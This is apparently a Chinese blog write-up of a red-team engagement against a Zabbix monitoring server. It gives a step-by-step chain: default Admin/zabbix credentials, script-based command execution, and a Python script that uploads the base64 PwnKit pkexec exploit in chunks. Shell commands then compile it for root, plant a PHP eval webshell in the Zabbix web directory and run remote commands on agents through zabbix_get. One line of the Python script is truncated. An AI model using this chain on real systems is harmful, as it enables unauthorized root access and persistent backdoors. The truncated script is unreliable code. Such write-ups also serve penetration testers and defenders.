<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XKhmivS1_TarPD5yKgzQwA)

前言

记录一下之前实战攻防遇到的一次 zabbix 获取 shell 的过程。

实战
--

开始收集资产，发现一处 zabbix 存在 Admin/zabbix 弱口令。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYG5saw9riboE6zJo5hpoqcaq9AHCHCaMyTzM9QO3F7svnXPeibc5d2tP9w/640?wx_fmt=png&from=appmsg)

平平无奇，添加执行脚本 getshell，以下可以选择脚本执行在 server 或者 agent 上:

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYG6xuqad7ZevIgVqVpqqSkY6aHUzABPlxyD86P1XOwHyhP23F4pdiaaUA/640?wx_fmt=png&from=appmsg)

选择其中的 server 或者某个 agent 执行刚才添加的脚本进行命令执行：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGWoCaByrAviaeRH6WSKG1Ph1wJkIB99UjEY1aicHWhpOfR1X2EP0Qze2w/640?wx_fmt=png&from=appmsg)

到这里已经可以执行命令了，但是作为一个入口点，还是需要有一个稳定执行的 shell 或者代理，现在问题是 server 和 agent 都不能出网。不能通过远程下载的形式，下载再执行。

后面想通过 zabbix web 直接写入 webshell，（这里大多数 zabbix 都是默认安全的的 web 目录为 / usr/share/zabbix/，如果不是这个目录可以在 zabbix 的 conf 文件查看 web 配置）：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYG7QtTSUGictxAb5vgYibNTKksSiclXRm5mlbHhbz3GDWajIdmbbXzuCwGQ/640?wx_fmt=png&from=appmsg)

但是又遇到一个问题，当前权限为 zabbix，直接 echo 显示权限不足：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGPibLa1GCXL2sH6mwHQW0pGib9Ks0IQlRKmc0ibIR0STxeUZibEKYkFcKEw/640?wx_fmt=png&from=appmsg)

所以只能提权后再进行后续操作，这里操作刚好发现有 pkexec：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGG3Ldxzcb8F1718cMGiaBZLpDryOic50icmXKLwficJ2FmnZfgukaiaDeOXw/640?wx_fmt=png&from=appmsg)

直接把需要编译的 PwnKit.c 文件 base64 之后，echo 到 tmp 再 decode 再编译，但是又遇到一个限制 script 内容长度：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGUB638DezQyDZrrgKcEL5COp7XSRS2QzDlIhTobZNcFd6adOayOPDkA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGyEc6ryuqj3U0mPl8nkf0DcymjRvsUQ90OTmZ4OLm3E6aUEJIMZTCdg/640?wx_fmt=png&from=appmsg)

所以最后通过写了一个 py 自动发包不断 echo 到一个文件内容中，然后每次脚本更新后在 host 中的 server 执行一遍，对应的两个包为：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGUB638DezQyDZrrgKcEL5COp7XSRS2QzDlIhTobZNcFd6adOayOPDkA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGDCLkicYwRCGiaT6jYaQIjqyjcPa3oQ4pWMUk0yrtkcic09oNPRM6Bn2TA/640?wx_fmt=png&from=appmsg)

```
import string
import re
import time

import httpx

pk = """
xxxxxx
"""
def spl():
   pkdata = re.findall(r'.{100}',pk)
   print(pkdata)
   postdata(pkdata)


def postdata(pkdata):
   url = "http://xxxxx/zabbix.php"
   header = {"Cookie": "PHPSESSID=tpml18t36bg03bsadjqura4hff; zbx_sessionid=58fc6634281cfc38408db8ff012568f3",
             "Content-Type": "application/x-www-form-urlencoded",
             "Connection": "close"}

   url2 = "http://xxxxxx/zabbix.php?sid=408db8ff012568f3&action=popup.scriptexec"
   data2 = "hostid=10084&scriptid=63"

   for pk in pkdata:
       data = "sid=408db8ff012568f3&form_refresh=1&form=1&scriptid=63&
       data = data.replace('kktest',pk)
       print(data)
       res = httpx.post(url=url,data=data,headers=header,verify=False)
       time.sleep(0.2)
       res2 = httpx.post(url = url2,data=data2,headers=header,verify=False)
       if res2.status_code == 200:
           print("true")

if __name__ == '__main__':
   spl()


```

把 base64 的字符每百个分割写进 txt 中：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGXqzngOQ867fdCMHhBqKlVEXanyq3ibRyjBtOvtIPCTJhRwLRBuFzsbw/640?wx_fmt=png&from=appmsg)

把最后不足 100 个的也 post 进去，然后 base64 解码：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGVdkfX2BibmibH7ib0QweoicE9fXnF9vqqdicDpK04VuDnEq6CoXERxOX9qw/640?wx_fmt=png&from=appmsg)

这里通过上面的 cat 内容发现两个问题：

*   zabbix 脚本 echo 的内容 “+” 会换成控制；
    
*   因为是分段 echo，所以需要消除换行符
    

这里通过 sed 命令对以上两个问题进行解决：

*   消除换行符：sed ':t;N;s/\n//;b t' /tmp/3.txt  >> /tmp/pksrc.txt
    
*   空格换成 +：sed -i 's/ /+/g' Input_File /tmp/pksrc.txt
    

之后进行解码：base64 -d /tmp/pksrc.txt > /tmp/pksrc.c

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGR3chkkUwOJ3zQAGjflk0GzZ6XwIWWsEpprJW5M6jbVvR6iaw1PUygkA/640?wx_fmt=png&from=appmsg)

然后进行编译 gcc -shared /tmp/pksrc.c -o /tmp/pk -Wl,-e,entry -fPIC

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGicibiauxqKgz6iceEf0A1FVVcjick8zx29KnQZDx9NNcicvZDicN9BB9gAdZA/640?wx_fmt=png&from=appmsg)

编译完成之后执行，这里注意需要 cd 到当前目录执行，否则加权限也不能执行：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGPibLa1GCXL2sH6mwHQW0pGib9Ks0IQlRKmc0ibIR0STxeUZibEKYkFcKEw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGGe6icj91TPaqd06Ld64oaCNJorKibR5rzQHlBW8lXwppVwicZJS0ufSrQ/640?wx_fmt=png&from=appmsg)

root 之后就比较简单，直接 echo 一个 shell 到 zabbix 的 web 目录就可以了：

```
cd /tmp/ ; ./pk "echo 'PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg==' >> /usr/share/zabbix/indel.php"
cd /tmp/ ; ./pk "cat /usr/share/zabbix/indel.php"
cd /tmp/ ; ./pk "base64 -d /usr/share/zabbix/indel.php > /usr/share/zabbix/indel.php"
cd /tmp/ ; ./pk "cat /usr/share/zabbix/indel.php"

```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGJu0yClue4fu04icdapEhnoZJIsye0ibBmejDiaa0YLvjdQMaicd5aMQjAg/640?wx_fmt=png&from=appmsg)

后利用
---

当然有了 zabbix server 的权限之后，我们除了在 web 界面添加脚本执行之外，还可以通过 zabbix_get 命令在 server 上对 agent 进行信息监控和接管：

比如：zabbix_get -s 127.0.0.1 -p 10050 -k 'system.uname'

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGp7vRjykvFAMia7Uib1LvYGA9Iz6rvksuVm2FRQmZhj86NZvK8foNLEwg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgwR0jmlPl4zwXKe4UEepNYGGFWaiaujbuO5pqVniapg9lKksVLShn54PzRjXKP08Sax4rumRkFXwpLg/640?wx_fmt=png&from=appmsg)

当然在 agent 的 conf 文件中如果开启了 EnableRemoteCommands 这个参数也可以通过 zabbix_get 命令进行命令执行：zabbix_get -s ip -p 10050 -k 'system.run[whoami]'

参考

https://paper.seebug.org/1697/

https://github.com/ly4k/PwnKit